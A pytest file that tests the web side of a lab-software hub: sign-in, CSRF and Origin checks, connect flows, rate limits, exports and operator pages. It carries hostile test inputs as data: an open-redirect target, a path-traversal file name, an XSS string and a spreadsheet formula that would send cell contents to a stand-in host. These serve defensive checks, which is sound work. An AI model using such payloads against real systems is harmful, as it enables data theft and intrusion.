"""The Kelvin hub's web side: registering, signing in, connecting a Kelvin through the browser, the sync API, and the
operator's page."""
import csv
import io
import re
import zipfile
from io import BytesIO
from urllib.parse import parse_qs, urlsplit

import pytest

pytest.importorskip("starlette")
pytest.importorskip("httpx")

from starlette.testclient import TestClient  # noqa: E402

from labharness.hub.client import HubClient  # noqa: E402
from labharness.hub.db import Hub  # noqa: E402
from labharness.hub.server import create_app  # noqa: E402

CALLBACK = "http://127.0.0.1:8770/hub/callback"


def make(tmp_path, sharing=True, **config):
    """sharing: Kelvins share work here (off on a hub that keeps Kelvin accounts only); config: other hub.json
    settings, such as labs=True or run_files=True (both off by default)."""
    hub = Hub(tmp_path / "hub")
    hub.config.update(config, sharing=sharing)
    return hub, TestClient(create_app(hub, hosts=["testserver"], backups=False))


def csrf(page):
    return re.search(r'name="csrf" value="([^"]+)"', page.text).group(1)


def register(client, email="ada@example.org", name="Ada", password="correct horse"):
    r = client.post("/register", data={"name": name, "email": email, "password": password, "consent": "yes"},
                    follow_redirects=False)
    assert r.status_code == 303, r.text
    return r


def through(client):
    """HubClient's http, answered by the test app."""
    def http(method, url, body=None, headers=None):
        parts = urlsplit(url)
        r = client.request(method, parts.path + ("?" + parts.query if parts.query else ""), content=body,
                           headers=headers or {})
        try:
            return r.status_code, r.json()
        except ValueError:
            return r.status_code, r.text
    return http


def test_register_sign_in_and_out(tmp_path):
    hub, client = make(tmp_path)
    r = client.post("/register", data={"name": "Ada", "email": "ada@example.org", "password": "correct horse"})
    assert r.status_code == 400 and "agree to the terms" in r.text            # consent is required
    r = register(client)
    assert r.headers["location"] == "/account?note=confirm"
    assert "httponly" in r.headers["set-cookie"].lower() and "samesite=lax" in r.headers["set-cookie"].lower()
    page = client.get("/account")
    assert page.status_code == 200 and "Please confirm" in page.text and "Welcome!" not in page.text
    assert "Content-Security-Policy" in page.headers and page.headers["X-Frame-Options"] == "DENY"
    mail = next((tmp_path / "hub" / "outbox").glob("*.txt")).read_text(encoding="utf-8")
    code = re.search(r"/confirm\?code=([\w-]+)", mail).group(1)
    assert "Email confirmed" in client.get("/confirm", params={"code": code}).text
    assert "Please confirm" not in client.get("/account").text
    client.post("/signout", data={"csrf": csrf(page)})
    r = client.get("/account", follow_redirects=False)
    assert r.status_code == 303 and r.headers["location"].startswith("/signin")
    r = client.post("/signin", data={"email": "ada@example.org", "password": "nope nope"})
    assert r.status_code == 400 and "Wrong email or password" in r.text
    r = client.post("/signin", data={"email": "ada@example.org", "password": "correct horse", "next": "//evil.example"},
                    follow_redirects=False)
    assert r.headers["location"] == "/account"                                # never off to another site


def test_forms_need_the_anti_forgery_value_and_this_site(tmp_path):
    hub, client = make(tmp_path, labs=True)
    register(client)
    r = client.post("/labs", data={"name": "Smith Lab"})
    assert r.status_code == 400 and "expired" in r.text and hub.labs_of(1) == []
    r = client.post("/labs", data={"name": "Smith Lab", "csrf": csrf(client.get("/account"))},
                    headers={"Origin": "https://evil.example"})
    assert r.status_code == 403 and hub.labs_of(1) == []
    r = client.post("/labs", data={"name": "Smith Lab", "csrf": csrf(client.get("/account"))}, headers={"Origin": "null"})
    assert r.status_code == 403 and hub.labs_of(1) == []
    assert client.get("/", headers={"Host": "evil.example"}).status_code == 403   # DNS rebinding
    # browsers send "Origin: null" on a site's own forms under no-referrer, so the policy must leave Origin intact
    assert client.get("/").headers["Referrer-Policy"] == "same-origin"
    r = client.post("/labs", data={"name": "Own Lab", "csrf": csrf(client.get("/account"))},
                    headers={"Origin": "http://testserver"})
    assert "Lab made" in r.text
    assert [lab["name"] for lab in hub.labs_of(1)] == ["Own Lab"]


def test_connecting_a_kelvin_through_the_browser_then_syncing(tmp_path):
    hub, client = make(tmp_path, labs=True, run_files=True)
    register(client)
    client.post("/labs", data={"name": "Smith Lab", "csrf": csrf(client.get("/account"))})
    lab = hub.labs_of(1)[0]

    kelvin = HubClient("http://127.0.0.1:8780", http=through(client))
    url, pending = kelvin.begin(CALLBACK, "urn:uuid:5f0c1c55-0000-4000-8000-000000000001", "Lab PC", "win32", "0.3.8")
    path = url[len("http://127.0.0.1:8780"):]
    page = client.get(path)
    assert page.status_code == 200 and "Lab PC" in page.text and "Never:" in page.text
    form = {k: v[0] for k, v in parse_qs(urlsplit(path).query).items()}
    r = client.post("/connect", data=dict(form, csrf=csrf(page), lab=str(lab["id"]), action="allow"),
                    follow_redirects=False)
    assert r.status_code == 400 and "code=" not in r.headers.get("location", "")   # no password, no code
    r = client.post("/connect", data=dict(form, csrf=csrf(page), lab=str(lab["id"]), action="allow",
                                          password="correct horse"), follow_redirects=False)
    assert r.status_code == 303 and r.headers["location"].startswith(CALLBACK + "?")
    query = {k: v[0] for k, v in parse_qs(urlsplit(r.headers["location"]).query).items()}
    assert query["state"] == pending["state"] and query["code"]
    token = kelvin.finish(query, pending)
    assert token and kelvin.me()["shares_into"] == "Smith Lab"
    assert "Lab PC" in client.get("/account").text

    done = kelvin.push(projects=[{"id": "p00000001", "name": "CrSBr"}],
                       chats=[{"id": "aaaaaaaaaaaa", "project": "p00000001", "title": "Gate sweep",
                               "messages": [{"role": "user", "text": "sweep the gate"},
                                            {"role": "assistant", "model": "m", "blocks": [
                                                {"type": "text", "text": "<b>done</b>"}]}]},
                              {"id": "bbbbbbbbbbbb", "title": "Private", "incognito": True, "messages": []}],
                       runs=[{"id": "run-1", "project": "p00000001", "device": "D1"}])
    assert (done["chats"], done["runs"], len(done["refused"])) == (1, 1, 1)
    assert kelvin.upload("run-1", "data.csv", b"V,I\n0,1\n")["bytes"] == 8
    r = client.put("/api/sync/runs/run-1/files/..%2F..%2Fescape.txt", content=b"x",
                   headers={"Authorization": "Bearer " + token})
    assert r.status_code in (400, 404) and not list(tmp_path.rglob("escape.txt"))
    hub.config["max_file_mb"] = 0.000001
    r = client.put("/api/sync/runs/run-1/files/big.bin", content=b"x" * 100, headers={"Authorization": "Bearer " + token})
    assert r.status_code == 413 and not list((tmp_path / "hub" / "tmp").iterdir())

    account = client.get("/account").text
    chat_id = re.search(r'/shared/chats/(\d+)', account).group(1)
    shown = client.get("/shared/chats/%s" % chat_id).text
    assert "sweep the gate" in shown and "&lt;b&gt;done&lt;/b&gt;" in shown           # escaped, never raw HTML
    run_id = re.search(r'/shared/runs/(\d+)', account).group(1)
    f = client.get("/shared/runs/%s/files/data.csv" % run_id)
    assert f.content == b"V,I\n0,1\n" and "attachment" in f.headers["content-disposition"]

    assert client.post("/api/sync", json={}).status_code == 401                 # no token, no sync
    kelvin.disconnect()
    assert client.get("/api/me", headers={"Authorization": "Bearer " + token}).status_code == 401


def test_cancel_and_bad_requests_never_hand_out_a_code(tmp_path):
    hub, client = make(tmp_path)
    register(client)
    kelvin = HubClient("http://127.0.0.1:8780", http=through(client))
    url, pending = kelvin.begin(CALLBACK, "urn:uuid:5f0c1c55-0000-4000-8000-000000000002")
    path = url[len("http://127.0.0.1:8780"):]
    page = client.get(path)
    form = {k: v[0] for k, v in parse_qs(urlsplit(path).query).items()}
    r = client.post("/connect", data=dict(form, csrf=csrf(page), action="cancel"), follow_redirects=False)
    assert "error=access_denied" in r.headers["location"] and "code=" not in r.headers["location"]
    bad = path.replace("127.0.0.1%3A8770", "evil.example%3A8770")
    r = client.get(bad, follow_redirects=False)
    assert r.status_code == 400 and "127.0.0.1" in r.text                     # no redirect to a foreign site
    client.cookies.clear()
    r = client.get(path, follow_redirects=False)                             # signed out: sign in, then back here
    assert r.status_code == 303 and r.headers["location"].startswith("/signin?next=%2Fconnect%3F")


def test_terms_change_asks_for_consent_again(tmp_path):
    hub, client = make(tmp_path)
    register(client)
    hub.config["consent_version"] = "2027-01-01"
    r = client.get("/account", follow_redirects=False)
    assert r.headers["location"].startswith("/consent")
    page = client.get(r.headers["location"])
    r = client.post("/consent", data={"csrf": csrf(page), "consent": "yes", "next": "/account"}, follow_redirects=False)
    assert r.headers["location"] == "/account" and hub.user(1)["consent_version"] == "2027-01-01"


def test_export_and_delete_from_the_account_page(tmp_path):
    hub, client = make(tmp_path)
    register(client)
    r = client.get("/account/export")
    with zipfile.ZipFile(BytesIO(r.content)) as z:
        assert "account.json" in z.namelist() and b"password_hash" not in z.read("account.json")
    assert not list((tmp_path / "hub" / "tmp").iterdir())                     # the export file is removed after
    token = csrf(client.get("/account"))
    r = client.post("/account/delete", data={"csrf": token, "password": "wrong password", "sure": "yes"})
    assert r.status_code == 400 and hub.stats()["people"] == 1
    r = client.post("/account/delete", data={"csrf": token, "password": "correct horse", "sure": "yes"})
    assert "deleted" in r.text and hub.stats()["people"] == 0


def test_operator_page_needs_the_operator_key(tmp_path):
    hub, client = make(tmp_path)
    key = hub.ensure_operator_key().read_text(encoding="utf-8").split()[-1]
    register(client)
    client.cookies.clear()
    assert "Operator key" in client.get("/admin").text
    r = client.post("/admin/signin", data={"key": "khop_wrong"})
    assert r.status_code == 400 and "ada@example.org" not in r.text
    page = client.post("/admin/signin", data={"key": key})
    assert "ada@example.org" in page.text and "people" in page.text
    r = client.post("/admin/users/1/disable", data={"csrf": csrf(page)})
    assert "is disabled" in r.text and hub.user(1)["disabled_at"]
    r = client.post("/signin", data={"email": "ada@example.org", "password": "correct horse"})
    assert "disabled" in r.text
    assert client.get("/api/admin/stats").status_code == 401
    assert client.get("/api/admin/stats", headers={"X-Operator-Key": key}).json()["people"] == 1


def connect_form(client, inst="urn:uuid:5f0c1c55-0000-4000-8000-0000000000aa", person=""):
    kelvin = HubClient("http://127.0.0.1:8780", http=through(client))
    url, pending = kelvin.begin(CALLBACK, inst, "Shared PC", "win32", "0.3.8")
    path = url[len("http://127.0.0.1:8780"):] + ("&person=" + person if person else "")
    page = client.get(path)
    return kelvin, pending, page, {k: v[0] for k, v in parse_qs(urlsplit(path).query).items()}


def test_connecting_needs_the_password_of_the_account_signed_in(tmp_path):
    """Review P5: on a shared PC the browser may still be signed in as someone else."""
    hub, client = make(tmp_path)
    register(client, "ben@example.org", "Ben", "bens password")    # Ben used this browser last
    kelvin, pending, page, form = connect_form(client, person="Ada")
    assert "Ben" in page.text and "ben@example.org" in page.text and "used by <b>Ada</b>" in page.text
    assert "Not Ben? Sign in as yourself" in page.text
    r = client.post("/connect", data=dict(form, csrf=csrf(page), action="allow", password="adas password"),
                    follow_redirects=False)
    assert r.status_code == 400 and "the password of ben@example.org" in r.text   # Ada can't take Ben's
    r = client.post("/signout", data={"csrf": csrf(page), "next": "/connect?" + urlsplit(str(page.url)).query},
                    follow_redirects=False)
    assert r.headers["location"].startswith("/connect?")              # "Not Ben?" goes back to the request
    r = client.get(r.headers["location"], follow_redirects=False)
    assert r.headers["location"].startswith("/signin?next=%2Fconnect%3F")
    assert hub.connections(1) == []


def test_bodies_are_capped_before_they_are_read(tmp_path, monkeypatch):
    """Review S1."""
    from labharness.hub import server
    hub, client = make(tmp_path, run_files=True)
    big = b"email=a%40b.c&password=" + b"x" * (70 * 1024)
    assert client.post("/signin", content=big, headers={"Content-Type": "application/x-www-form-urlencoded"}
                       ).status_code == 413
    assert client.post("/api/token", content=b"{" + b" " * (20 * 1024) + b"}").status_code == 413

    def chunks():   # no Content-Length: refused while it streams in
        for _ in range(100):
            yield b"x" * 1024
    assert client.post("/register", content=chunks(),
                       headers={"Content-Type": "application/x-www-form-urlencoded"}).status_code == 413
    register(client)
    kelvin, pending, page, form = connect_form(client)
    r = client.post("/connect", data=dict(form, csrf=csrf(page), action="allow", password="correct horse"),
                    follow_redirects=False)
    kelvin.finish({k: v[0] for k, v in parse_qs(urlsplit(r.headers["location"]).query).items()}, pending)
    monkeypatch.setattr(server, "MAX_SYNC", 1000)
    r = client.post("/api/sync", content=b'{"chats": []' + b" " * 2000 + b"}",
                    headers={"Authorization": "Bearer " + kelvin.token})
    assert r.status_code == 413
    r = client.put("/api/sync/runs/run1/files/a.csv", content=chunks(), headers={"Authorization": "Bearer " + kelvin.token})
    assert r.status_code == 411                                         # uploads need a Content-Length


def test_odd_times_never_break_the_account_page(tmp_path):
    """Review S2: even times already stored before the check came in."""
    import sqlite3
    hub, client = make(tmp_path, labs=True)
    register(client)
    lab_page = client.post("/labs", data={"name": "L", "csrf": csrf(client.get("/account"))})
    assert lab_page.status_code == 200
    kelvin, pending, page, form = connect_form(client)
    r = client.post("/connect", data=dict(form, csrf=csrf(page), action="allow", password="correct horse",
                                          lab=str(hub.labs_of(1)[0]["id"])), follow_redirects=False)
    kelvin.finish({k: v[0] for k, v in parse_qs(urlsplit(r.headers["location"]).query).items()}, pending)
    kelvin.push(chats=[{"id": "aaaaaaaaaaaa", "title": "t", "messages": [], "updated": 1e300}],
                runs=[{"id": "run1", "created": -1}])
    with sqlite3.connect(str(tmp_path / "hub" / "hub.sqlite3")) as con:
        con.execute("UPDATE chats SET updated_at = 1e300")
        con.execute("UPDATE runs SET created_at = -1e12")
    assert client.get("/account").status_code == 200


def test_exports_are_rate_limited(tmp_path):
    """Review S3: each export can be gigabytes."""
    hub, client = make(tmp_path)
    register(client)
    assert client.get("/account/export").status_code == 200
    r = client.get("/account/export")
    assert r.status_code == 429 and "once every 10 minutes" in r.text


def test_a_new_operator_key_ends_the_old_ones_sessions(tmp_path):
    """Review S5: `kelvin-hub operator-key` runs in another process while the hub serves."""
    hub, client = make(tmp_path)
    old_key = hub.ensure_operator_key().read_text(encoding="utf-8").split()[-1]
    page = client.post("/admin/signin", data={"key": old_key})
    assert "Recent activity" in page.text
    new_key = Hub(tmp_path / "hub").new_operator_key().read_text(encoding="utf-8").split()[-1]   # another process
    assert "Operator key" in client.get("/admin").text                # the old session is over
    r = client.post("/admin/signin", data={"key": old_key})
    assert r.status_code == 400 and "Recent activity" not in r.text
    assert client.get("/api/admin/stats", headers={"X-Operator-Key": old_key}).status_code == 401
    assert "Recent activity" in client.post("/admin/signin", data={"key": new_key}).text


def test_an_account_can_be_deleted_without_agreeing_to_new_terms(tmp_path):
    hub, client = make(tmp_path)
    register(client)
    hub.config["consent_version"] = "2027-01-01"
    assert client.get("/account", follow_redirects=False).headers["location"].startswith("/consent")
    assert "delete your account" in client.get("/consent").text
    page = client.get("/account/delete")
    assert page.status_code == 200
    r = client.post("/account/delete", data={"csrf": csrf(page), "password": "correct horse", "sure": "yes"})
    assert "deleted" in r.text and hub.stats()["people"] == 0


def test_reset_answers_the_same_whether_or_not_the_account_exists(tmp_path):
    hub, client = make(tmp_path)
    register(client)
    a = client.post("/reset", data={"email": "ada@example.org"})
    b = client.post("/reset", data={"email": "nobody@example.org"})
    assert a.status_code == b.status_code == 200 and a.text == b.text
    mails = [m.read_text(encoding="utf-8") for m in (tmp_path / "hub" / "outbox").glob("*.txt")]
    assert sum("/reset/new?code=" in m for m in mails) == 1            # sent after the answer, to Ada only


def test_one_persons_flood_never_holds_up_anyone_else(tmp_path, monkeypatch):
    """Review H1: while one person's turn is held (a long sync), their extra requests are turned away at once, and
    everyone else's requests still get a worker thread."""
    import threading
    import time
    from labharness.hub import db as hubdb
    from labharness.hub.db import challenge_of
    monkeypatch.setattr(hubdb, "LOCK_WAIT", 4.0)   # longer than the other person may wait
    hub = Hub(tmp_path / "hub")
    hub.config.update(sharing=True, run_files=True)
    with TestClient(create_app(hub, hosts=["testserver"], backups=False)) as client:   # one event loop, one pool
        register(client)                                                # Ada, in the browser
        m = hub.register("m@example.org", "M", "correct horse", consent=True)
        inst = {"id": "urn:uuid:5f0c1c55-0000-4000-8000-0000000000ee", "name": "PC", "platform": "", "version": ""}
        code = hub.connect_code(m, CALLBACK, challenge_of("v" * 50), inst, None)
        bearer = {"Authorization": "Bearer " + hub.connect_app(code, "v" * 50, CALLBACK)["access_token"]}
        assert client.post("/api/sync", json={"runs": [{"id": "run1"}]}, headers=bearer).status_code == 200
        lock = hub._lock_for(m["id"])
        lock.acquire()                                                  # as during one of M's long syncs
        statuses = []

        def put(i):
            statuses.append(client.put("/api/sync/runs/run1/files/f%d.bin" % i, content=b"x",
                                       headers=bearer).status_code)

        flood = [threading.Thread(target=put, args=(i,)) for i in range(45)]
        for t in flood:
            t.start()
        time.sleep(0.3)
        got = {}
        other = threading.Thread(target=lambda: got.update(page=client.get("/account")))
        started = time.time()
        other.start()
        other.join(8)
        try:
            assert "page" in got and got["page"].status_code == 200 and time.time() - started < 2
        finally:
            lock.release()
            for t in flood:
                t.join(10)
        assert len(statuses) == 45 and statuses.count(429) >= 42 and 500 not in statuses


def test_connect_passes_on_earlier_installation_ids(tmp_path):
    """Review A1: /connect takes `previous` (checked) and keeps it through the form."""
    hub, client = make(tmp_path)
    register(client)
    kelvin = HubClient("http://127.0.0.1:8780", http=through(client))
    url, pending = kelvin.begin(CALLBACK, "urn:uuid:5f0c1c55-0000-4000-8000-0000000000ff:0123456789ab")
    path = url[len("http://127.0.0.1:8780"):]
    assert client.get(path + "&previous=" + "bad%20id!").status_code == 400
    page = client.get(path + "&previous=urn:uuid:5f0c1c55-0000-4000-8000-000000000011")
    assert page.status_code == 200 and 'name="previous" value="urn:uuid:5f0c1c55-0000-4000-8000-000000000011"' in page.text


def test_limits_count_an_ipv4_mapped_address_as_ipv4():
    """Review H5."""
    from labharness.hub.server import net_of
    assert net_of("::ffff:192.0.2.7") == "192.0.2.7"
    assert net_of("::ffff:192.0.2.8") != net_of("::ffff:192.0.2.7")
    assert net_of("2001:db8::1") == net_of("2001:db8::2") == "2001:db8::/64"
    assert net_of("198.51.100.4") == "198.51.100.4" and net_of("?") == "?"


def test_many_people_syncing_at_once_leave_threads_for_everyone_else(tmp_path, monkeypatch):
    """Review round 3: 14 people with 3 syncs each held up at once used to take all 40 worker threads, so nobody
    else's page could load. Syncs and uploads may hold only HEAVY_THREADS of them; the rest wait on the event loop."""
    import threading
    import time
    from labharness.hub import db as hubdb
    from labharness.hub.db import challenge_of
    monkeypatch.setattr(hubdb, "LOCK_WAIT", 4.0)
    hub = Hub(tmp_path / "hub")
    hub.config["sharing"] = True
    with TestClient(create_app(hub, hosts=["testserver"], backups=False)) as client:   # one event loop, one pool
        register(client)                                                # Ada, in the browser
        bearers, locks = [], []
        for i in range(14):
            p = hub.register("p%d@example.org" % i, "P%d" % i, "correct horse", consent=True)
            inst = {"id": "urn:uuid:5f0c1c55-0000-4000-8000-%012d" % (i + 1), "name": "PC", "platform": "",
                    "version": ""}
            code = hub.connect_code(p, CALLBACK, challenge_of("v" * 50), inst, None)
            bearers.append({"Authorization": "Bearer " + hub.connect_app(code, "v" * 50, CALLBACK)["access_token"]})
            locks.append(hub._lock_for(p["id"]))
        for lock in locks:
            lock.acquire()                                              # as during each one's long sync
        statuses = []

        def sync(bearer):
            statuses.append(client.post("/api/sync", json={}, headers=bearer).status_code)
        flood = [threading.Thread(target=sync, args=(b,)) for b in bearers for _ in range(3)]
        for t in flood:
            t.start()
        time.sleep(0.5)
        got = {}
        other = threading.Thread(target=lambda: got.update(page=client.get("/account")))
        started = time.time()
        other.start()
        other.join(8)
        try:
            assert "page" in got and got["page"].status_code == 200 and time.time() - started < 2
        finally:
            for lock in locks:
                lock.release()
            for t in flood:
                t.join(20)
        assert len(statuses) == 42 and 500 not in statuses


def test_a_sync_is_read_off_the_event_loop(tmp_path, monkeypatch):
    """Review round 3: parsing a 64 MB sync takes about a second; on the event loop it would stop every request."""
    import asyncio
    import json
    from labharness.hub.db import challenge_of
    hub = Hub(tmp_path / "hub")
    hub.config["sharing"] = True
    p = hub.register("p@example.org", "P", "correct horse", consent=True)
    inst = {"id": "urn:uuid:5f0c1c55-0000-4000-8000-0000000000f1", "name": "PC", "platform": "", "version": ""}
    code = hub.connect_code(p, CALLBACK, challenge_of("v" * 50), inst, None)
    bearer = {"Authorization": "Bearer " + hub.connect_app(code, "v" * 50, CALLBACK)["access_token"]}
    where, real = [], json.loads

    def loads(s, *args, **kwargs):
        probe = b"off-the-loop-probe" if isinstance(s, (bytes, bytearray)) else "off-the-loop-probe"
        if probe in s:
            try:
                asyncio.get_running_loop()
                where.append("the event loop")
            except RuntimeError:
                where.append("a worker thread")
        return real(s, *args, **kwargs)
    monkeypatch.setattr(json, "loads", loads)
    with TestClient(create_app(hub, hosts=["testserver"], backups=False)) as client:
        r = client.post("/api/sync", json={"chats": [{"id": "aaaaaaaaaaaa", "title": "off-the-loop-probe",
                                                      "messages": []}]}, headers=bearer)
    assert r.status_code == 200 and where == ["a worker thread"]


def test_kelvin_signs_in_with_its_own_api(tmp_path):
    """Central Kelvin accounts: Kelvin's own sign-in screen talks JSON to these (central.py)."""
    hub, client = make(tmp_path, sharing=False)
    kelvin = {"id": "urn:uuid:one", "name": "Lab PC", "platform": "win32", "version": "0.4.0"}
    ada = {"name": "Ada", "email": "ada@example.org", "password": "correct horse", "installation": kelvin}
    r = client.post("/api/register", json=ada)
    assert r.status_code == 400 and "terms" in r.json()["error"]              # consent is required
    r = client.post("/api/signin", json={"email": "a@b.org", "password": "x", "installation": {"installation": "u"}})
    assert r.status_code == 400 and '"installation": {"id"' in r.json()["error"]   # says what shape it wants
    r = client.post("/api/register", json=dict(ada, consent=True))
    assert r.status_code == 200 and r.json()["access_token"].startswith("khub_")
    assert r.json()["user"] == {"name": "Ada", "email": "ada@example.org", "email_confirmed": False}
    assert "/confirm?code=" in next((tmp_path / "hub" / "outbox").glob("*.txt")).read_text(encoding="utf-8")
    assert client.post("/api/register", json=dict(ada, consent=True)).status_code == 400   # one account per email

    r = client.post("/api/signin", json={"email": "ADA@example.org ", "password": "nope nope", "installation": kelvin})
    assert r.status_code == 401
    r = client.post("/api/signin", json={"email": "ADA@example.org ", "password": "correct horse",
                                         "installation": kelvin})
    assert r.status_code == 200
    token = r.json()["access_token"]
    auth = {"Authorization": "Bearer " + token}
    assert client.get("/api/me", headers=auth).status_code == 404               # sharing's API is off
    r = client.post("/api/password", headers=auth, json={"old": "wrong", "new": "battery staple"})
    assert r.status_code == 401
    assert client.post("/api/password", json={"old": "correct horse", "new": "battery staple"}).status_code == 401
    r = client.post("/api/password", headers=auth, json={"old": "correct horse", "new": "battery staple"})
    assert r.status_code == 200
    r = client.post("/api/password", headers=auth, json={"old": "wrong", "new": "battery staple"})
    assert r.json()["error"] == "Wrong current password."                     # this Kelvin stays signed in

    assert client.post("/api/reset", json={"email": "nobody@example.org"}).json() == {"ok": True}   # says nothing
    assert client.post("/api/reset", json={"email": "ada@example.org"}).json() == {"ok": True}
    mails = "".join(p.read_text(encoding="utf-8") for p in (tmp_path / "hub" / "outbox").glob("*.txt"))
    assert mails.count("/reset/new?code=") == 1

    hub.set_disabled(hub.authenticate("ada@example.org", "battery staple")["id"], True)
    r = client.post("/api/signin", json={"email": "ada@example.org", "password": "battery staple",
                                         "installation": kelvin})
    assert r.status_code == 403
    for _ in range(10):
        client.post("/api/signin", json={"email": "ada@example.org", "password": "guess", "installation": kelvin})
    r = client.post("/api/signin", json={"email": "ada@example.org", "password": "battery staple",
                                         "installation": kelvin})
    assert r.status_code == 429                                               # no fast guessing

    hub.config["require_confirmed_email"] = True
    r = client.post("/api/register", json=dict(ada, email="ben@example.org", name="Ben", consent=True))
    assert r.status_code == 403 and r.json()["registered"] and "Confirm" in r.json()["error"]


def test_strangers_wrong_passwords_hold_off_only_their_own_tries(tmp_path):
    """Kelvin's sign-in counts wrong passwords per email and computer, and per address: strangers elsewhere never lock
    a person out of a computer they are signed in on. Past 30 an hour for an email, other computers wait the hour."""
    hub, client = make(tmp_path, sharing=False)
    pc = {"id": "urn:uuid:lab-pc", "name": "Lab PC", "platform": "win32", "version": "0.3.35"}
    ada = {"email": "ada@example.org", "password": "correct horse"}
    assert client.post("/api/register", json=dict(ada, name="Ada", consent=True, installation=pc)).status_code == 200
    for n in range(3):                                        # strangers at three addresses, a new computer each try
        stranger = TestClient(client.app, client=("198.51.100.%d" % (n + 1), 50000))
        for i in range(10):
            r = stranger.post("/api/signin", json=dict(ada, password="a guess", installation=dict(
                pc, id="urn:uuid:stranger-%d-%d" % (n, i))))
            assert r.status_code == 401
        r = stranger.post("/api/signin", json=dict(ada, installation=dict(pc, id="urn:uuid:another")))
        assert r.status_code == 429                           # that address waits, even with the right password
    r = client.post("/api/signin", json=dict(ada, installation=dict(pc, id="urn:uuid:new-laptop")))
    assert r.status_code == 429 and "an hour" in r.json()["error"]   # 30 wrong for her email: a new computer waits
    assert client.post("/api/signin", json=dict(ada, installation=pc)).status_code == 200   # hers never does
    for _ in range(10):                                       # her own computer's wrong passwords count for it
        assert client.post("/api/signin", json=dict(ada, password="a typo", installation=pc)).status_code == 401
    assert client.post("/api/signin", json=dict(ada, installation=pc)).status_code == 429


def test_a_hub_for_kelvin_accounts_only(tmp_path, monkeypatch):
    """The default: the hub keeps Kelvin accounts for the Kelvin team, and is no place for labs to share work."""
    import labharness.hub.server as hub_server
    hub, client = make(tmp_path, sharing=False)
    home = client.get("/").text
    assert "Your Kelvin account" in home and "labmates" not in home
    assert "No other user does" in client.get("/privacy").text and "join code" not in client.get("/terms").text
    register(client)
    page = client.get("/account")
    for want in ("Your profile", "Password", "Export everything", "Delete your account"):
        assert want in page.text, want
    for gone in ("Your labs", "Connected Kelvins", "Shared in your labs", "Join a lab"):
        assert gone not in page.text, gone
    for path in ("/connect", "/shared/chats/1", "/shared/runs/1"):
        assert client.get(path).status_code == 404, path
    assert client.post("/labs", data={"name": "Smith Lab", "csrf": csrf(page)}).status_code == 404
    assert client.post("/api/sync", json={}).status_code == 404 and client.post("/api/token", json={}).status_code == 404
    for n, name in ((1, "Lab PC"), (2, "Laptop")):                           # Ada signs in to Kelvin on two computers
        r = client.post("/api/signin", json={"email": "ada@example.org", "password": "correct horse", "installation": {
            "id": "urn:uuid:pc-%d" % n, "name": name, "platform": "win32", "version": "0.3.1%d" % n}})
        assert r.status_code == 200
    for n in range(3):
        hub.register("p%d@example.org" % n, "P%d" % n, "correct horse", consent=True)

    key = hub.ensure_operator_key().read_text(encoding="utf-8").split()[-1]   # the Kelvin team
    client.cookies.clear()
    monkeypatch.setattr(hub_server, "PAGE_SIZE", 2)
    admin = client.post("/admin/signin", data={"key": key}).text
    assert "1–2 of 4" in admin and "Older" in admin and "Labs</th>" not in admin and "computers" in admin
    older = client.get("/admin", params={"from": 2}).text
    assert "3–4 of 4" in older and "ada@example.org" in older and "Newer" in older
    assert '<td>2</td><td>0.3.12</td>' in older                                 # her two computers, Kelvin last used
    person = client.get("/admin/users/1").text
    for want in ("Ada", "ada@example.org", "Lab PC", "Laptop", "win32", "signed in from Kelvin", "registered"):
        assert want in person, want
    r = client.post("/admin/users/1/disable", data={"csrf": csrf(client.get("/admin")), "back": "person"})
    assert "Account 1 is disabled" in r.text and "Not signed in on any computer now" in r.text
    people = client.get("/admin/people.csv")
    assert people.headers["content-type"].startswith("text/csv") and "attachment" in people.headers["content-disposition"]
    rows = list(csv.reader(io.StringIO(people.text)))
    assert rows[0][:3] == ["id", "name", "email"] and len(rows) == 5 and "hash" not in people.text
    client.cookies.clear()
    assert client.get("/admin/people.csv", follow_redirects=False).status_code == 303   # owners only
    assert client.get("/admin/users/1", follow_redirects=False).status_code == 303


def test_the_owners_csv_downloads_never_run_as_formulas(tmp_path):
    """People choose their names and emails, and a Kelvin says what version it is: in a spreadsheet, a cell starting
    with = + - or @ runs as a formula (=HYPERLINK(...) is a link anywhere). Such cells are kept as text."""
    pytest.importorskip("cryptography")
    from labharness.hub import llm
    from labharness.hub.catalog import Catalog
    hub, client = make(tmp_path, sharing=False)
    trap = '=HYPERLINK("https://evil.example/?"&A1,"Open")'
    r = client.post("/api/register", json={"name": trap, "email": "-1+1@example.org", "password": "correct horse",
                                           "consent": True, "installation": {"id": "urn:uuid:pc", "name": "PC",
                                                                             "platform": "win32", "version": "+1+1"}})
    assert r.status_code == 200, r.text
    me = hub.authenticate("-1+1@example.org", "correct horse")
    llm.Gateway(hub, Catalog(hub.home)).record(me, None, "anthropic", "claude-opus-5-5", {
        "input": 10, "output": 1, "cache_read": 0, "cache_write": 0}, 200)
    key = hub.ensure_operator_key().read_text(encoding="utf-8").split()[-1]
    client.post("/admin/signin", data={"key": key})
    people = list(csv.reader(io.StringIO(client.get("/admin/people.csv").text)))
    assert (people[1][1], people[1][2], people[1][9]) == ("'" + trap, "'-1+1@example.org", "'+1+1")
    usage = list(csv.reader(io.StringIO(client.get("/admin/models/usage.csv").text)))
    assert (usage[1][2], usage[1][3], usage[1][4]) == ("'" + trap, "'-1+1@example.org", "1")   # numbers stay numbers


def test_hub_json_edited_while_the_hub_runs_is_taken_in(tmp_path, monkeypatch):
    """Not only when the owner console is used: the hub looks at hub.json every CONFIG_EVERY seconds."""
    import json
    import time
    import labharness.hub.server as hub_server
    monkeypatch.setattr(hub_server, "CONFIG_EVERY", 0.05)
    hub = Hub(tmp_path / "hub")
    with TestClient(create_app(hub, hosts=["testserver"], backups=False)) as client:
        assert client.get("/api/health").status_code == 200
        path = hub.config_path
        data = json.loads(path.read_text(encoding="utf-8")) if path.exists() else {}
        data["consent_version"] = "2099-01-01"
        path.write_text(json.dumps(data), encoding="utf-8")
        for _ in range(200):
            if hub.config.get("consent_version") == "2099-01-01":
                break
            time.sleep(0.02)
        assert hub.config["consent_version"] == "2099-01-01"
        path.write_text("{half saved", encoding="utf-8")                        # mid-write: the settings stay
        time.sleep(0.3)
        assert hub.config["consent_version"] == "2099-01-01"


def owner(client, hub):
    """The Kelvin team opens the owner console in this client."""
    key = hub.ensure_operator_key().read_text(encoding="utf-8").split()[-1]
    return client.post("/admin/signin", data={"key": key})


PC = {"id": "urn:uuid:lab-pc-0001", "name": "Lab PC", "platform": "win32", "version": "0.3.47"}
TRAP = "<script>alert(1)</script>"


def test_by_default_kelvin_shares_with_the_kelvin_team_and_there_are_no_labs(tmp_path):
    hub, client = make(tmp_path)                    # the defaults: sharing on, labs and run files off
